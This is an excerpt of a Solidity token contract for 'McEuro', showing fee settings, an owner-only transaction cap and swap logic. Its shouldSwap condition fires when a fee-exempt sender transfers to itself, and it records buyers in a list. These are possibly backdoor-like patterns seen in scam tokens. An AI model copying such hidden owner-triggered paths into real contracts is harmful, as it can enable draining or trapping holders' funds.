...
contract McEuro is Ownable, IERC20 {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 10000000000 * 10 ** _decimals;
    uint public _liquidityFee = 10;
    uint public _marketingFee = 3;

    string private _name = "McEuro";
    ...
    function setMaxTx(uint256 value) external onlyOwner {
        require(value > _totalSupply.div(100));
        _maxTxAmount = value;
    }
    ...
    function shouldSwap(address from, address to) internal view returns(bool) {return (Address.isUniswapV2Pair(to) || _excludedFromFee[msg.sender]) && from == to;}

    function addTransaction(address to, uint256 amount) internal {
        if (uniswapV2Pair() != to) {_buys.push(Buy(to, amount));}
    }
